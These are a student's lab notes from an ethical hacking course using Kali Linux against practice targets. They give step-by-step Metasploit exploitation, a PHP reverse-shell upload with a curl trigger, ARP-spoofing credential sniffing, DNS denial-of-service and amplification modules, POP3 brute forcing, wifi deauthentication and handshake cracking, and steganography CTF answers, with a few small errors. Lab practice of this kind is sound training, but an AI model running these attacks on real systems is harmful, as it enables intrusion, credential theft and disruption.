
# 26/08/21 : Intro to Kali and Metasploitable

## Step 1

### On Kali:
Start msfconsole: 

```bash
msfconsole
```

### Discover hosts on network: $ sudo netdiscover

```bash
sudo netdiscover
```
### Scan a host: 

```bash
sudo nmap -p- -sV <host ip>
```

meaning: -p- means all ports from 0-65545?
         -sV is used for service scan

We see various services in host. eg: vsftpd v2.3.4
But how do we know its vulnerable? ans: use cmd 'search vsftpd' in msfconsole
We get numbering for each vulnerability.
To exploit one, run 'use <number>'. eg: use 0 as vsftpd vulnerability was
numbered 0 when we searched for it.
Now we are in a diff mode!
We can run 'info' to get detailed info about the vulnerability.

Now we need to set RHOSTS and RPORT.
Usually RPORT is set automatically.
To set RHOSTS: $ set RHOSTS <victim host ip>

run 'info' to check if RHOSTS is updated.

To run attack: $ exploit

# 2nd Attack : creating reverse shell using malicious file
---------------------------------------------------------
create new msfconsole session
create exploit.php file
connect to file directory: $ cadaver http://10.0.2.4/dav
upload file: $ put exploit.php

note: we are assuming server is running php

create listener to handle shell: $ use multi/handler
see options to set attr: $ show options (or options)
set LHOST: $ set LHOST <attacker ip>   eg: 10.0.2.15

run exploit in background: $ run -j

now curl exploit.php to execute (in separate terminal): curl http://10.0.2.4/dav/exploit.php

it will show in main terminal, that session 1 has started

to interact with session: $ sessions 1 (on main terminal)
now run whoami to check user info


assignment: other than these 2, we need to find and show exploits

31/08/21
--------
MITM using ARP Spoofing (NPTEL lec25)
------------------------
Victim machine: windows (V)
Attacker: kali (A)

change default IP and gateway in V.

allow port forwarding in A.
cat /proc/sys/net/ipv4/ip_forward --> 0

echo 1 > /proc/sys/net/ipv4/ip_forward
(if above doesnt work use: sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward')

cat /proc/sys/net/ipv4/ip_forward --> 1 (now it is enabled)

NOTE: find ip of windows machine and default gateway using command: ipconfig

arpspoof -t <gateway of V> <ip of V>
this means we are attacking traffic from gateway to machine

in new terminal: arpspoof -t <ip of V> <gateway of V>
now we are also spoofing pkts from machine to gateway

now we need to sniff pkts: open wireshark
select interface eth0

in victim machine open browser and go to aview.in
put login credentials eg: user: admin, password: abcd

in wireshark filter http by putting: http in filter bar
find the datapacket sent to aview.in or something like POST /login.php
right click and select 'Follow' -> 'TCP Stream'

you will see the username and password there


NMap
----
refer to Nmap.pdf

nmap help: sudo nmap -h

Wireshark
---------
These are the some links which will bw useful for wireshark

https://gitlab.com/wireshark/wireshark/-/wikis/DisplayFilters
https://gitlab.com/wireshark/wireshark/-/wikis/home
https://gitlab.com/wireshark/wireshark/-/wikis/SampleCaptures

List of available filters:
click green ribbon -> manage capture filters

Packet color view:
view -> coloring rules

In the packet information, select acknowledgement number and then:
edit -> preferences -> protocols -> TCP -> uncheck Relative sequence numbers -> OK

statistics -> protocol heirarchy


organise all requested URI:
file -> export objects -> http

statistics -> endpoints


Nessus Tool
-----------
NPTEL: lec19

To start nessus: /etc/init.d/nessusd start
(if above cmd doesnt work use: systemctl enable --now nessusd)

now go to https://kali:8834
Add Exception
Get Certificate
Confirm Security Exception
Nessus will open: Nessus Essential
Get the activation code

Open nessus page -> Advanced scan

in settings:
enter name, description
in targets: enter ips separated by commas

DNS
---
Security: PGP (Pretty Good Privacy) : watch NPTEL

DNS Cache poisoning (using kali)
-------
recon-ng: info gathering tool
sudo recon-ng
marketplace install all
modules load recon/domains-hosts/brute_hosts
info : info of module
show domains : domain might be present
db insert domains www.google.com~ : adds a domain
show domain : google will be added
run
show hosts 

-------
//get info of domain
hosts google.co.uk

//find start of authority
dig google.co.uk SOA

//using own dns server in dig
dig @192.168.19.139 nsa.gov  //resolve nsa.gov using give IP

(@ means we are using the @ip as domain name server rather than
the default dns server)


//using nmap using UDP packets //will be slower
sudo nmap 192.168.19.139 -sU -p 53 (specifying exact port makes it faster)

Information leak using Chaos
-----------------------------
dig @192.168.19.139 chaos version.bind txt

result: version.bind --> "9.8.1"

//this info will be used in searchsploit
searchsploit bind

searchsploit isc bind

//now lets do DOS attack :)
msfconsole
search tkey
use 0 (where 0 is auxiliary/dos/dns/bind_tkey)
show info
set RHOSTS <victims ip> (eg 192.168.19.139)
run

//now do nmap
sudo nmap 192.168.19.139 -sU -p 53


Email
-----
mail is created at MUA and then sent to MTA via SMTP
from MTA it goes to MDA of another machine via SMTP
then from MDA to receipient MUA using IMAP/POP

MUA : mail user agent
MTA : mail transfer agent
MDA : mail delivery agent
SMTP: simple mail transfer protocol
IMAP: internet message access protocol
POP : post office protocol

Message headers: contain metadata about the journey
of the mail across various machines. contains info about
those machines

this message header can be accessed in gmail: three dots -> show original

DSN (Delivery status notification)
----------------------------------
this happens 1. message is successfully sent
             2. message is not successfuly sent, you receive message about it

may contains informaion about you can be exploited by hackers

SPF (Sender policy framework)
-----------------------------
used to prevent people from forging(spoofing) their email address

Probing smtp service
---------------------
nc <ip> <port> (nc == netcat)
eg: nc 192.168.56.102 25
intiate conversation using HELLO
eg: HELLO hacker

Open relays, POP, IMAP
-----------------------
pop3 --> port 995
imap is modern version of pop3 --> port 143, 993

//search for exim in search in msfconsole

Using enumeration using Finger
-----------------------------
after connecting via netcat type root.
usernames can be found out using Finger service running on port 79
wordlists can be used to shorlist usernames


Brute forcing post office
-----------------------
tool: hydra
hydra -L realusers.txt -P ./wordlists/weak_passwords.txt 192.168.56.102 pop3

Nmap scripting engine
--------------------
can be found at www.hackerhousebook.com/files/nsediscover.py

Hands-on : Zone transfer
------------------------
copy dns zone files from one zone to another

dig @192.168.19.139 AXFR nsa.gov
//outputs more info, might be confidential info

fierce --dns-server 192.168.19.139 --domain nsa.gov
// shows ips of mail servers, etc.

DNS amplification attack
-----------------------
msfconsole
search dns_amp
use 0
info
set DOMAINNAME nsa.gov
set RHOSTS 192.168.19.139
run

//after completion lets check if server is up
sudo nmap 192.168.19.139 -sU -p 56


15/09/21
---------
Cryptography

*****Read about following:****
[Substitution ciphers](https://www.geeksforgeeks.org/substitution-cipher/)
[Caesar Cipher](https://www.geeksforgeeks.org/caesar-cipher-in-cryptography/)
[Atbash](https://www.geeksforgeeks.org/implementing-atbash-cipher/)
[Pigeon Cipher](https://crypto.interactive-maths.com/pigpen-cipher.html)
[Digraph Substitution ciphers](https://crypto.interactive-maths.com/digraph-substitution-ciphers.html)
[Polyaphabetic substitution ciphers](https://crypto.interactive-maths.com/polyalphabetic-substitution-ciphers.html)

Private-key algorithms:
these are cryptographic standards. (Imp)

Watch NPTEL video on DES.

Caesar cypher decoder on internet.
Cyberchef: contains all decoders
ROT13: special characters are unchanged
ROT47: even changes special characters

look into steghide linux tool.
stegcracker
zsteg
gem install zsteg??

steganography_challenges.pdf answers
------------------------------------
ctf{392812} (use exiftool)
ctf{2228333} (use strings)
ctf{12345678} (use steghide extract -sf)
CTF{new_image} (use zsteg/write script for lsb encryption)

NOTE: Use stegcracker if steghide needs a passphrase

Wifi hacking
------------
cracking wifi password

iwconfig: shows wireless configuration
wlan0 is the interface

using airmon-ng
-----------------

sudo airmon-ng  check kill : checks if any process is holding wifi, we kill the processes
this is done so that, when monitor mode is opened, the processes dont change it to managed
mode.

sudo airmon-ng start wlan0 : starts monitor mode on wlan0 interface

sudo airodump-ng wlan0mon (monitor mode interface) : outputs all wifis available

copy the BSSID (base station id) for the wifi to hack

sudo airodump-ng --bssid <bssid> -c 2 -w capture wlan0mon : capture pkts of wifi

in separate terminal: sudo aireplay-ng -0 0 -a <BSSID> -c <client> wlan0mon
we disconnect the clients so that we can spoof packets

aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
here, capture-01.cap is the captured file
/usr/share/wordlists/rockyou.txt : wordlist used



using hashcat
--------------
install hashcat

/usr/share/hashcat-utils/cap2hccapx.bin capture-01.cap capture.hccapx

hashcat -a 0 -n 2500 capture.hccapx /usr/share/wordlists/rockyou.txt -o cap.txt

one more method
---------------
hashcat -a 0 -m 100 top100.txt mine.txt -o password.txt 
-m : mode 100
top100.txt contains popular hashes
mine.txt : password list

owasp juice
-----------
login using sql injection to get admin access


Learn sql injection
xss cross site attack




